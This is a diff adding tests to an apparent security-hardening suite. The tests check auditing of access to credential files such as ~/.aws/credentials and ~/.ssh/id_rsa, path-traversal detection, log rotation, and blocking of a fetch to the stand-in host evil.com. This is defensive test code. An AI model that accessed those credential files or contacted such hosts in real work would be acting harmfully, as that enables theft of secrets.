@@ -352,6 +352,140 @@ describe("fs-monitor", () => {
     __resetFsMonitorForTest();
     expect(isFsMonitorActive()).toBe(false);
   });
+
+  it("audits write operations to sensitive paths", () => {
+    const events: SecurityEvent[] = [];
+    initHardeningLogger({ logFile: "/dev/null", onEvent: (e) => events.push(e) });
+    installFsMonitor();
+
+    const awsCreds = path.join(os.homedir(), ".aws", "credentials");
+    auditFileAccess(awsCreds, "write");
+    const writeEvents = events.filter(
+      (e) => e.type === "sensitive_file_access" && e.detail.operation === "write",
+    );
+    expect(writeEvents).toHaveLength(1);
+  });
+
+  it("audits stat/unlink operations on sensitive paths", () => {
+    const events: SecurityEvent[] = [];
+    initHardeningLogger({ logFile: "/dev/null", onEvent: (e) => events.push(e) });
+    installFsMonitor();
+
+    const sshKey = path.join(os.homedir(), ".ssh", "id_rsa");
+    auditFileAccess(sshKey, "stat");
+    auditFileAccess(sshKey, "unlink");
+
+    const fsEvents = events.filter((e) => e.type === "sensitive_file_access");
+    expect(fsEvents).toHaveLength(2);
+    expect(fsEvents[0].detail.operation).toBe("stat");
+    expect(fsEvents[1].detail.operation).toBe("unlink");
+  });
+
+  it("includes stack trace in audit events", () => {
+    const events: SecurityEvent[] = [];
+    initHardeningLogger({ logFile: "/dev/null", onEvent: (e) => events.push(e) });
+    installFsMonitor();
+
+    const sshKey = path.join(os.homedir(), ".ssh", "id_rsa");
+    auditFileAccess(sshKey, "read");
+
+    const fsEvent = events.find((e) => e.type === "sensitive_file_access");
+    expect(fsEvent).toBeDefined();
+    expect(fsEvent!.detail.stackTrace).toBeTruthy();
+    expect(typeof fsEvent!.detail.stackTrace).toBe("string");
+  });
+
+  it("normalizes paths with .. to detect traversal", () => {
+    installFsMonitor();
+
+    const home = os.homedir();
+    // Path traversal: ~/Documents/../.ssh/id_rsa resolves to ~/.ssh/id_rsa
+    const traversalPath = path.join(home, "Documents", "..", ".ssh", "id_rsa");
+    expect(isSensitivePath(traversalPath)).toBe(true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Log Rotation
+// ---------------------------------------------------------------------------
+
+describe("hardening-logger rotation", () => {
+  let tmpDir: string;
+
+  beforeEach(async () => {
+    __resetHardeningLoggerForTest();
+    tmpDir = await fs.promises.mkdtemp(path.join(os.tmpdir(), "moltbot-log-rotation-"));
+  });
+
+  afterEach(async () => {
+    __resetHardeningLoggerForTest();
+    await fs.promises.rm(tmpDir, { recursive: true, force: true }).catch(() => {});
+  });
+
+  it("continues logging after rotation without crashing", () => {
+    const events: SecurityEvent[] = [];
+    const logFile = path.join(tmpDir, "test.log");
+    // Tiny threshold so rotation triggers quickly
+    initHardeningLogger({
+      logFile,
+      maxFileSizeBytes: 50,
+      maxRotatedFiles: 2,
+      onEvent: (e) => events.push(e),
+    });
+
+    // Write many events to trigger multiple rotations
+    for (let i = 0; i < 20; i++) {
+      logSecurityEvent("hardening_init", { iteration: i, padding: "x".repeat(30) });
+    }
+
+    // All events should be captured by the callback regardless of rotation
+    expect(events).toHaveLength(20);
+    // Logger should still be functional (no crash from rotation)
+    logSecurityEvent("hardening_init", { final: true });
+    expect(events).toHaveLength(21);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Network Monitor - Stack Traces & WebSocket
+// ---------------------------------------------------------------------------
+
+describe("network-monitor stack traces", () => {
+  beforeEach(() => {
+    __resetNetworkMonitorForTest();
+    __resetHardeningLoggerForTest();
+  });
+
+  afterEach(() => {
+    __resetNetworkMonitorForTest();
+    __resetHardeningLoggerForTest();
+  });
+
+  it("includes stack trace in blocked fetch events", async () => {
+    const events: SecurityEvent[] = [];
+    initHardeningLogger({ logFile: "/dev/null", onEvent: (e) => events.push(e) });
+    installNetworkMonitor({ enforce: true });
+
+    try {
+      await fetch("https://evil.com/data");
+    } catch {
+      // expected
+    }
+
+    const blocked = events.find((e) => e.type === "blocked_network");
+    expect(blocked).toBeDefined();
+    expect(blocked!.detail.stackTrace).toBeTruthy();
+    expect(typeof blocked!.detail.stackTrace).toBe("string");
+  });
+
+  it("blocks IP address access (not in whitelist)", () => {
+    installNetworkMonitor();
+    // Raw IP addresses should not be allowed unless explicitly whitelisted
+    expect(isDomainAllowed("1.2.3.4")).toBe(false);
+    expect(isDomainAllowed("192.168.1.1")).toBe(false);
+    // But loopback is whitelisted
+    expect(isDomainAllowed("127.0.0.1")).toBe(true);
+  });
 });
 
 // ---------------------------------------------------------------------------
